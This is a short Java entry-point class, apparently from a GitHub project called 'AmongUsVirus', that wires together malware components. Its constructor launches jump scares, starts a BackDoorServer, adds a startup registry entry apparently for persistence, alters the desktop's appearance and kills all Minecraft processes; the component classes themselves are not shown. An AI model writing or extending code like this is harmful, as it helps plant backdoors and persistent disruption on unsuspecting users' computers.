package com.github.pulsebeat02;

import com.github.pulsebeat02.appearance.AppearanceChanger;
import com.github.pulsebeat02.backdoor.BackDoorServer;
import com.github.pulsebeat02.backdoor.ServerStartup;
import com.github.pulsebeat02.jumpscare.RandomJumpScare;
import com.github.pulsebeat02.utility.TaskUtilities;

public class AmongUsVirus {

  public AmongUsVirus() throws Exception {
    new RandomJumpScare();
    new BackDoorServer();
    new ServerStartup().addRegistry();
    new AppearanceChanger();
    new RandomJumpScare();
    TaskUtilities.killAllTasks("Minecraft");
  }

  public static void main(final String[] args) {
    // new RandomJumpScare();
    new AppearanceChanger();
  }
}
